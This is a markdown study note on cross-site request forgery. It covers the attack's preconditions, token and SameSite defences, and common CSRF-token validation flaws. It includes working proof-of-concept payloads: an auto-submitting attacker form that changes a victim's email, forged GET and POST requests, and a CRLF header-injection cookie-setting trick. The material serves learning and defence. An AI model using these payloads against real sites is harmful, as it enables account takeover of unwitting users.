- [General Concept](#general-concept)
  - [Example](#example)
- [Constructing and Delivering](#constructing-and-delivering)
- [Prevention](#prevention)
  - [CSRF Tokens](#csrf-tokens)
    - [Common Flaws](#common-flaws)

# General Concept
Cross-site request forgery is a vulnerability that allows attackers to induce users to perform
actions they don't intend to perform. It will enable partial circumvention of the same origin policy
that prevents sites from interfering with each other. 

In a successful attack, the victim unintentionally carries out an action, such as changing the email 
address on their account, changing their password, or transferring funds. The attacker might be able to gain
full control over the user's account, and if that account is privileged, the full application. 

There are three conditions that enable a CSRF attack:
- **Relevant action.** There needs to be an action within the app that the attacker has a reason to induce.
- **Cookie-based session handling.** Performing the action needs to involve issuing 1+ HTTP requests, and the
  application relies solely on session cookies to id the user who made the request. 
- **No unpredictable request parameters.** The requests that perform the action can't contain parameters
  whose values the attacker can't determine/guess. 

## Example
Suppose there is an app that has a function for the user to change the email address for their account. 
When the user performs this action, they make an HTTP request like the following:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=asdfghjkl

email=weiner@normal-user.com
```
Then the attacker can construct a web page with the following HTML:

```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
If a user visits the attacker's webpage, then:
- The attacker's page will trigger an HTTP request to the vulnerable site
- If the user is logged on the vulnerable site, their browser will auto-include their session cookie in
  the request (assuming SameSite cookies aren't being used)
- The vulnerable website will process the request the normal way, treating it as though it were made by
  the victim, and change their email address

Note that CSRF is normally talked about concerning cookie-based session handling, but it also 
comes up in other contexts where the app auto adds some user credentials to requests, like 
HTTP Basic auth and certificate-based auth. 

# Constructing and Delivering
Construct with:
- Automated tools: Burp Suite Pro
- Manual writing (cumbersome)

The delivery mechanisms are essentially the same as for reflected XXS. Typically, the attacker will 
place the malicious HTML onto a website they control and then induce victims to visit that site. 

Some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the
vulnerable site. In this situation, the attacker might not need to have an external site. 

# Prevention
Most common defenses:
- **CSRF tokens** - a unique, secret, and unpredictable value that is generated by the server-side app and
  shared with the client. When performing a sensitive action, the client must include the correct CSRF
  token in the request, which makes it hard to construct a valid request on behalf of the victim.
- **SameSite cookies** - SameSite is a browser security mechanism that determines when a site's cookies are
  included in requests originating from other sites. This prevents an attacker from triggering certain
  actions cross-site. As of '21, Chrome enforces SameSite restriction by default. 
- **Referer-based validation** - Some apps use the HTTP Referer header to verify the request originated
  from the app's domain. Generally less effective than CSRF token validation.

## CSRF Tokens
A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form.

```
Example:

  <form name="change-email-form" action="/my-account/change-email" method="POST">
      <label>Email</label>
      <input required type="email" name="email" value="example@normal-website.com">
      <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
      <button class='button' type='submit'> Update email </button>
  </form>
```

When implemented correctly, CSRF tokens make it difficult to construct a valid request on behalf of a 
victim, as they won't be able to predict the correct value and include it in the malicious request. 

Note that CSRF tokens don't have to be sent as hidden parameters in a `POST` request. Some apps place
them in headers. The way tokens are transmitted has a significant impact on the security of a mechanism as 
a whole. 

### Common Flaws
- **Request method** - Some apps only validate the token when the request uses the POST method, rather
  than POST and GET. If this is the case, the attacker can switch to the GET method to bypass the
  validation

  ```
  Example:
    GET /email/change?email=pwned@evil-user.net HTTP/1.1
    Host: vulnerable-website.com
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
  ```
- **Token Presence** - Some apps skip validation if the token is omitted. In this case, the attacker
  can remove the entire parameter containing the token to bypass the validation and deliver the attack
  ```
  Example:
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

    email=pwned@evil-user.net
  ```
- **Not tied to session** - Some apps don't validate that the token belongs to the same session as the
    user making the request, instead maintaining a global pool of tokens that it issued and accepts.
    In this case, the attacker can log in to the app with their own account, get a valid token, and
    then feed that token to the victim
- **Tied to non-session cookie** - A variation of the preceding, some apps tie the token to a cookie, but
    not to the same cookie that is used to track sessions. This easily happens when the app uses different
    frameworks for session handling and CSRF protection and they aren't integrated
    ```
    Example:
      POST /email/change HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 68
      Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

      csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
    ```
    This is harder to exploit, but it's vulnerable. If the site in any way allows the attacker to set a
    cookie in the victim's browser, then it's possible. Any other app within the same DNS domain can
    potentially be leveraged to set cookies in the target app. The attacker can log in using their own
    account, get a valid token/cookie set, place their cookie in the victim's browser, and feed their token
    into the CSRF attack
  ```
  Example:
  <html>
      <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
          <input type="hidden" name="email" value="pwned@evil-user.net" />
          <input type="hidden" name="csrf" value="fake" />
        </form>
        <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
      </body>
  </html>
  ```    
- **Duplicated cookie** - A variation of the preceding, some apps don't have any server-side record of
  issued tokens and instead duplicate each token within a cookie and a request parameter. When a subsequent
  request is validated, the app just verifies that the token in the request parameter matches the value
  submitted in the cookie. This is sometimes called the "double submit" defense and is advocated because
  it's simple and avoids the need for server-side state
  ```
  Example:
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

    csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
  ```
  In this case, the attacker can perform an attack if the website contains any cookie setting functionality.
  They don't need a valid token of their own, just to invent a token and then leverage the cookie-setting
  and feed their token in the attack
